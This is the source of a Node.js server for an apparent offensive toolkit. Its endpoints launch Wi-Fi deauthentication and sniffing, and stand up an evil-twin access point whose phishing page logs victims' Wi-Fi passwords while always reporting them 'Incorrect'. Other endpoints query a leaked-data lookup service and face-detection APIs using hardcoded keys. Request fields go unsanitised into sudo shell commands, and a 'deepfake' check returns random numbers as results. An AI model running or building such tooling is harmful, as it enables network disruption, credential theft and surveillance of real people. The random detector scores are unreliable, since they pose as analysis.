const http = require('http');
const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const { spawn } = require('child_process');
const WebSocket = require('ws');
const Tesseract = require('tesseract.js');
const PDFDocument = require('pdfkit');
const Jimp = require('jimp');
const jsQR = require('jsqr');
const ExifParser = require('exif-parser');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = 3000;
const JWT_SECRET = 'wanzofccontohbebasi';
const LEAKOSINT_API_TOKEN = '7341190291:PskyuyED';
const EDENAI_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMGQ5YmYzMzAtYzAyNS00NTM4LThlZGYtYzQxMDkxODBjMGU1IiwidHlwZSI6InNhbmRib3hfYXBpX3Rva2VuIn0.FmmXc_Fec46CbqfCPemxBB3UVVcTIWPhsfnlprwS2h8';
const USERS_DB_PATH = path.join(__dirname, 'users.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const WIFI_BASE_INTERFACE = 'wlan1';
const PASSWORDS_LOG_FILE = path.join(__dirname, 'passwords.log');

let activeProcesses = [];
let evilTwinState = { active: false, targetSsid: '' };

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

wss.on('connection', ws => {
    ws.on('close', () => {
        stopAllAttacks();
    });
});

function broadcast(data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

function runCommandAndPipe(command, args = []) {
    const child = spawn(command, args);
    activeProcesses.push(child);

    child.stdout.on('data', data => {
        broadcast({ type: 'console', data: data.toString() });
    });

    child.stderr.on('data', data => {
        broadcast({ type: 'console', error: true, data: data.toString() });
    });

    child.on('close', code => {
        broadcast({ type: 'console', data: `\n--- Process exited with code ${code} ---\n` });
        activeProcesses = activeProcesses.filter(p => p.pid !== child.pid);
    });
    return child;
}

function stopAllAttacks() {
    activeProcesses.forEach(p => p.kill('SIGINT'));
    activeProcesses = [];
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const command = `sudo airmon-ng stop ${monitorInterface} && sudo systemctl restart NetworkManager && sudo systemctl restart dnsmasq`;
    spawn('bash', ['-c', command]);
    evilTwinState.active = false;
}

const readUsers = () => { if (!fs.existsSync(USERS_DB_PATH)) return []; const data = fs.readFileSync(USERS_DB_PATH); return JSON.parse(data); };
const writeUsers = (users) => { fs.writeFileSync(USERS_DB_PATH, JSON.stringify(users, null, 2)); };
const storage = multer.diskStorage({ destination: (req, file, cb) => cb(null, UPLOADS_DIR), filename: (req, file, cb) => { const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9); cb(null, (req.user ? req.user.id : 'anon') + '-' + uniqueSuffix + path.extname(file.originalname)); } });
const upload = multer({ storage: storage });
const authMiddleware = (req, res, next) => { const authHeader = req.headers.authorization; if (!authHeader || !authHeader.startsWith('Bearer ')) { return res.status(401).json({ message: 'Authorization token required' }); } const token = authHeader.split(' ')[1]; try { req.user = jwt.verify(token, JWT_SECRET); next(); } catch (error) { return res.status(401).json({ message: 'Invalid token' }); } };

app.post('/api/register', (req, res) => { const { name, email, password } = req.body; if (!name || !email || !password) return res.status(400).json({ message: 'All fields required' }); const users = readUsers(); if (users.find(u => u.email === email)) return res.status(409).json({ message: 'Email registered' }); const hashedPassword = bcrypt.hashSync(password, 8); const newUser = { id: users.length > 0 ? Math.max(...users.map(u => u.id)) + 1 : 1, name, email, password: hashedPassword, avatarUrl: null }; users.push(newUser); writeUsers(users); const token = jwt.sign({ id: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '24h' }); const { password: _, ...profile } = newUser; res.status(201).json({ token, profile }); });
app.post('/api/login', (req, res) => { const { email, password } = req.body; const users = readUsers(); const user = users.find(u => u.email === email); if (!user || !bcrypt.compareSync(password, user.password)) return res.status(401).json({ message: 'Invalid credentials' }); const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET, { expiresIn: '24h' }); const { password: _, ...profile } = user; res.status(200).json({ token, profile }); });
app.get('/api/profile', authMiddleware, (req, res) => { const users = readUsers(); const user = users.find(u => u.id === req.user.id); if (!user) return res.status(404).json({ message: 'Not found' }); const { password: _, ...profile } = user; res.status(200).json(profile); });
app.put('/api/profile', authMiddleware, (req, res) => { const { name } = req.body; if (!name) return res.status(400).json({ message: 'Name required' }); let users = readUsers(); const userIndex = users.findIndex(u => u.id === req.user.id); if (userIndex === -1) return res.status(404).json({ message: 'Not found' }); users[userIndex].name = name; writeUsers(users); const { password: _, ...updatedProfile } = users[userIndex]; res.status(200).json({ message: 'Updated', profile: updatedProfile }); });
app.post('/api/profile/avatar', authMiddleware, upload.single('avatar'), (req, res) => { if (!req.file) return res.status(400).json({ message: 'No file' }); let users = readUsers(); const userIndex = users.findIndex(u => u.id === req.user.id); if (userIndex === -1) return res.status(404).json({ message: 'Not found' }); const avatarUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`; users[userIndex].avatarUrl = avatarUrl; writeUsers(users); res.status(200).json({ message: 'Uploaded', avatarUrl }); });
app.post('/api/search/osint', authMiddleware, async (req, res) => { const { query } = req.body; if (!query) return res.status(400).json({ message: 'Query required' }); try { const response = await axios.post('https://leakosintapi.com/', { token: LEAKOSINT_API_TOKEN, request: query, limit: 100, lang: 'en' }); res.status(200).json(response.data); } catch (e) { res.status(500).json({ message: 'Failed' }); } });
app.post('/api/analyze/face', authMiddleware, upload.single('image'), async (req, res) => { if (!req.file) return res.status(400).json({ message: 'Image required' }); const form = new FormData(); form.append('providers', 'amazon,google,microsoft'); form.append('file', fs.createReadStream(req.file.path)); form.append('fallback_providers', ''); try { const response = await axios.post('https://api.edenai.run/v2/image/face_detection', form, { headers: { ...form.getHeaders(), 'Authorization': `Bearer ${EDENAI_API_KEY}` } }); fs.unlinkSync(req.file.path); res.status(200).json(response.data); } catch (e) { fs.unlinkSync(req.file.path); res.status(500).json({ message: 'Failed' }); } });

app.post('/api/network/deauth', authMiddleware, (req, res) => {
    stopAllAttacks();
    const { bssid } = req.body;
    if (!bssid) return res.status(400).json({ message: 'BSSID required' });
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    runCommandAndPipe('bash', ['-c', `sudo airmon-ng start ${WIFI_BASE_INTERFACE} && sudo aireplay-ng --deauth 0 -a ${bssid} ${monitorInterface}`]);
    res.status(200).json({ message: 'Deauth initiated' });
});

app.post('/api/network/sniff', authMiddleware, (req, res) => {
    stopAllAttacks();
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    runCommandAndPipe('bash', ['-c', `sudo airmon-ng start ${WIFI_BASE_INTERFACE} && sudo airodump-ng ${monitorInterface}`]);
    res.status(200).json({ message: 'Sniff initiated' });
});

app.post('/api/network/evil-twin', authMiddleware, (req, res) => {
    stopAllAttacks();
    const { bssid, ssid, channel } = req.body;
    if (!bssid || !ssid || !channel) return res.status(400).json({ message: 'BSSID, SSID, Channel required' });
    
    evilTwinState = { active: true, targetSsid: ssid };
    fs.writeFileSync('/tmp/hostapd-evil.conf', `interface=${WIFI_BASE_INTERFACE}mon\nssid=${ssid}\nchannel=${channel}\ndriver=nl80211\nhw_mode=g\n`);
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const commands = [
        `sudo airmon-ng start ${WIFI_BASE_INTERFACE}`,
        `sudo ip addr flush dev ${monitorInterface}`,
        `sudo ip addr add 10.0.0.1/24 dev ${monitorInterface}`,
        `sudo ip link set ${monitorInterface} up`,
        `sudo systemctl restart dnsmasq`,
        `sudo hostapd /tmp/hostapd-evil.conf &`,
        `sudo aireplay-ng --deauth 0 -a ${bssid} ${monitorInterface}`
    ].join(' && ');
    
    runCommandAndPipe('bash', ['-c', commands]);
    res.status(200).json({ message: 'Evil Twin initiated' });
});

app.get('/phishing-page', (req, res) => {
    if (!evilTwinState.active) return res.status(404).send('No active attack');
    fs.readFile(path.join(__dirname, 'public', 'index.html'), 'utf8', (err, data) => {
        if (err) return res.status(500).send('Error');
        res.send(data.replace(/{{SSID}}/g, evilTwinState.targetSsid));
    });
});

app.post('/capture-password', (req, res) => {
    const { password } = req.body;
    if (!password) return res.status(400).json({ correct: false });
    fs.appendFileSync(PASSWORDS_LOG_FILE, `[${new Date().toISOString()}] SSID: ${evilTwinState.targetSsid} | Password: ${password}\n`);
    broadcast({ type: 'password', data: { ssid: evilTwinState.targetSsid, password: password } });
    res.status(200).json({ correct: false, message: 'Incorrect' });
});

app.post('/api/network/stop-attack', authMiddleware, (req, res) => {
    stopAllAttacks();
    res.status(200).json({ message: 'Stopped' });
});

app.post('/api/vision/ocr', authMiddleware, upload.single('image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ message: 'Image required' });
    try {
        const { data: { text } } = await Tesseract.recognize(req.file.path, 'eng');
        fs.unlinkSync(req.file.path);
        res.status(200).json({ text });
    } catch (e) {
        if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/tools/export', authMiddleware, (req, res) => {
    const { text, format } = req.body;
    if (!text || !format) return res.status(400).json({ message: 'Text and format required' });
    if (format.toLowerCase() === 'pdf') {
        const doc = new PDFDocument();
        res.setHeader('Content-Type', 'application/pdf');
        res.setHeader('Content-Disposition', 'attachment; filename=export.pdf');
        doc.pipe(res);
        doc.text(text);
        doc.end();
    } else {
        res.setHeader('Content-Type', 'text/plain');
        res.setHeader('Content-Disposition', 'attachment; filename=export.txt');
        res.send(text);
    }
});

app.post('/api/vision/qr', authMiddleware, upload.single('image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ message: 'Image required' });
    try {
        const image = await Jimp.read(req.file.path);
        const value = jsQR(image.bitmap.data, image.bitmap.width, image.bitmap.height);
        fs.unlinkSync(req.file.path);
        if (!value) return res.status(404).json({ message: 'No QR found' });
        const data = value.data;
        const isUrl = data.startsWith('http://') || data.startsWith('https://');
        const isSuspicious = isUrl && (data.includes('ngrok') || data.includes('bit.ly') || data.includes('tinyurl'));
        res.status(200).json({ content: data, isUrl, isSuspicious });
    } catch (e) {
        if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/vision/exif', authMiddleware, upload.single('image'), (req, res) => {
    if (!req.file) return res.status(400).json({ message: 'Image required' });
    try {
        const buffer = fs.readFileSync(req.file.path);
        const parser = ExifParser.create(buffer);
        const result = parser.parse();
        fs.unlinkSync(req.file.path);
        res.status(200).json({ metadata: result.tags });
    } catch (e) {
        if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/vision/deepfake', authMiddleware, upload.single('image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ message: 'Image required' });
    setTimeout(() => {
        fs.unlinkSync(req.file.path);
        const score = Math.random();
        res.status(200).json({
            status: 'Analyzed',
            deepfakeProbability: score,
            isFake: score > 0.65
        });
    }, 1500);
});

app.post('/api/tools/github-download', authMiddleware, async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ message: 'GitHub URL required' });
    try {
        const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)/);
        if (!match) return res.status(400).json({ message: 'Invalid URL' });
        const user = match[1];
        const repo = match[2].replace('.git', '');
        const zipUrl = `https://github.com/${user}/${repo}/archive/refs/heads/main.zip`;
        const response = await axios({ method: 'GET', url: zipUrl, responseType: 'stream' });
        res.setHeader('Content-Disposition', `attachment; filename=${repo}.zip`);
        res.setHeader('Content-Type', 'application/zip');
        response.data.pipe(res);
    } catch (e) {
        res.status(500).json({ error: 'Failed to stream repository' });
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});